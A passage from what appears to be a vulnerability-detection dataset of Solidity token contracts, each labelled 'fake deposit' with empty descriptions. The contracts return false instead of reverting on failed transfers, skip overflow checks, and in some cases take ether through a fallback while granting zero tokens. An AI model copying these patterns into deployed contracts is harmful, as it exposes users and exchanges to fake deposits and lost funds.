/*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                  \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'Spitz.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n   \r\n    function JapaneseSpitz() {\r\n        balances[msg.sender] = 10000000000000000000000000000;               \r\n        totalSupply = 10000000000000000000000000000;\r\n        name = \"Japanese Spitz\";\r\n        decimals = 18;                                               \r\n        symbol = \"Spitz\";                                             \r\n        unitsOneEthCanBuy = 0;          //7% bonus= OneEth//                           \r\n        fundsWallet = msg.sender;                                    \r\n    }\r\n\r\n    function() payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n       \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 1000000;                        // Update total supply (100000 for example)\r\n        name = \"FennyPenny\";                                   // Set the name for display purposes\r\n        decimals = 18;                            // Amount of decimals\r\n        symbol = \"FP\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.5.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP. Does not include\r\n * the optional functions; to access them see {ERC20Detailed}.\r\n */\r\ninterface ERC20Interface {\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `recipient`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ncontract ERC20Base is ERC20Interface {\r\n    // Empty internal constructor, to prevent people from mistakenly deploying\r\n    // an instance of this contract, which should be used via inheritance.\r\n    // constructor () internal { }\r\n    // solhint-disable-previous-line no-empty-blocks\r\n\r\n    mapping (address => uint256) public _balances;\r\n    mapping (address => mapping (address => uint256)) public _allowances;\r\n    uint256 public _totalSupply;\r\n\r\n    function transfer(address _to, uint256 _value) public returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[msg.sender] >= _value && _value > 0) {\r\n            _balances[msg.sender] -= _value;\r\n            _balances[_to] += _value;\r\n            emit Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { \r\n            return false;\r\n        }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\r\n            _balances[_to] += _value;\r\n            _balances[_from] -= _value;\r\n            _allowances[_from][msg.sender] -= _value;\r\n            emit Transfer(_from, _to, _value);\r\n            return true;\r\n        } else {\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _owner) public view returns (uint256 balance) {\r\n        return _balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) public returns (bool success) {\r\n        _allowances[msg.sender][_spender] = _value;\r\n        emit Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\r\n      return _allowances[_owner][_spender];\r\n    }\r\n    \r\n    function totalSupply() public view returns (uint256 total) {\r\n        return _totalSupply;\r\n    }\r\n}\r\n\r\ncontract FaircoverCoin is ERC20Base {\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    \r\n    constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\r\n        _name = name;\r\n        _symbol = symbol;\r\n        _decimals = decimals;\r\n        _totalSupply = initialSupply *  10  ** uint256(decimals);\r\n        _balances[msg.sender] = initialSupply  *  10  ** uint256(decimals);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5,05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.4.11;\r\n\r\n/**\r\n * Math operations with safety checks\r\n */\r\nlibrary SafeMath {\r\n  function mul(uint a, uint b) internal returns (uint) {\r\n    uint c = a * b;\r\n    assert(a == 0 || c / a == b);\r\n    return c;\r\n  }\r\n\r\n  function div(uint a, uint b) internal returns (uint) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    uint c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return c;\r\n  }\r\n\r\n  function sub(uint a, uint b) internal returns (uint) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n\r\n  function add(uint a, uint b) internal returns (uint) {\r\n    uint c = a + b;\r\n    assert(c >= a);\r\n    return c;\r\n  }\r\n\r\n  function max64(uint64 a, uint64 b) internal constant returns (uint64) {\r\n    return a >= b ? a : b;\r\n  }\r\n\r\n  function min64(uint64 a, uint64 b) internal constant returns (uint64) {\r\n    return a < b ? a : b;\r\n  }\r\n\r\n  function max256(uint256 a, uint256 b) internal constant returns (uint256) {\r\n    return a >= b ? a : b;\r\n  }\r\n\r\n  function min256(uint256 a, uint256 b) internal constant returns (uint256) {\r\n    return a < b ? a : b;\r\n  }\r\n\r\n  function assert(bool assertion) internal {\r\n    if (!assertion) {\r\n      throw;\r\n    }\r\n  }\r\n}\r\n\r\n/**\r\n * @title ERC20 interface\r\n * @dev see https://github.com/ethereum/EIPs/issues/20\r\n */\r\ncontract ERC20Basic  {\r\n    uint public totalSupply;\r\n    function balanceOf(address _owner) constant returns (uint balance);\r\n    function transfer(address _to, uint _value) returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool success);\r\n}\r\n  \r\n /**\r\n * @title Standard ERC20 token\r\n *\r\n * @dev Implemantation of the basic standard token.\r\n * @dev https://github.com/ethereum/EIPs/issues/20\r\n * @dev Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\r\n */ \r\n  \r\ncontract ERC20 is ERC20Basic {\r\n    function approve(address _spender, uint _value) returns (bool success);\r\n    function allowance(address _owner, address _spender) constant returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\n\r\ncontract StandardToken is ERC20 {\r\n        using SafeMath for uint;\r\n\r\n    function transfer(address _to, uint _value) returns (bool) {\r\n     \r\n        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint _value) returns (bool) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint _value) returns (bool) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint) balances;\r\n    mapping (address => mapping (address => uint)) allowed;\r\n    uint public totalSupply;\r\n}\r\n\r\n/**\r\n * @title Ownable\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\n * functions, this simplifies the implementation of \"user permissions\".\r\n */\r\ncontract Ownable {\r\n  address public owner;\r\n\r\n\r\n  /**\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\n   * account.\r\n   */\r\n  function Ownable() {\r\n    owner = msg.sender;\r\n  }\r\n\r\n\r\n  /**\r\n   * @dev Throws if called by any account other than the owner.\r\n   */\r\n  modifier onlyOwner() {\r\n    if (msg.sender != owner) {\r\n      throw;\r\n    }\r\n    _;\r\n  }\r\n\r\n\r\n  /**\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\n   * @param newOwner The address to transfer ownership to.\r\n   */\r\n  function transferOwnership(address newOwner) onlyOwner {\r\n    if (newOwner != address(0)) {\r\n      owner = newOwner;\r\n    }\r\n  }\r\n\r\n}\r\n\r\n/**\r\n * @title Bitcoin Moon Token contract\r\n */\r\n\r\ncontract BitcoinMoonToken is StandardToken, Ownable {\r\n\r\n    uint8 public decimals = 18;\r\n    uint public totalSupply = 50000000000 * 10 ** 18; \r\n    string public name = \"Bitcoin Moon Token\";\r\n    string public symbol = \"BMNT\";\r\n\r\n    function BitcoinMoonToken() {\r\n        balances[msg.sender] = totalSupply;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.25;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n    \r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n     \r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract SkyDoge is StandardToken { \r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                  \r\n    uint8 public decimals;                \r\n    string public symbol;                 \r\n    string public version = 'SOGE1.0'; \r\n    uint256 public unitsOneEthCanBuy;     \r\n    uint256 public totalEthInWei;         \r\n    address public fundsWallet;           \r\n\r\n   \r\n    function SkyDoge() {\r\n        balances[msg.sender] = 10000000000000000000000000000;               \r\n        totalSupply = 10000000000000000000000000000;\r\n        name = \"Sky Doge\";\r\n        decimals = 18;                                               \r\n        symbol = \"SOGE\";                                             \r\n        unitsOneEthCanBuy = 0;          //7% bonus= OneEth//                           \r\n        fundsWallet = msg.sender;                                    \r\n    }\r\n\r\n    function() payable{\r\n        totalEthInWei = totalEthInWei + msg.value;\r\n        uint256 amount = msg.value * unitsOneEthCanBuy;\r\n        require(balances[fundsWallet] >= amount);\r\n\r\n        balances[fundsWallet] = balances[fundsWallet] - amount;\r\n        balances[msg.sender] = balances[msg.sender] + amount;\r\n\r\n        Transfer(fundsWallet, msg.sender, amount); \r\n\r\n        fundsWallet.transfer(msg.value);                               \r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n       \r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.4;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract TokREI is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n\r\n    function TokREI(\r\n        ) {\r\n        balances[msg.sender] = 1000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 1000000;                        // Update total supply (100000 for example)\r\n        name = \"TokREI\";                                   // Set the name for display purposes\r\n        decimals = 5;                            // Amount of decimals for display purposes\r\n        symbol = \"TREI\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.25;\r\n\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n\r\n}\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n    \r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address 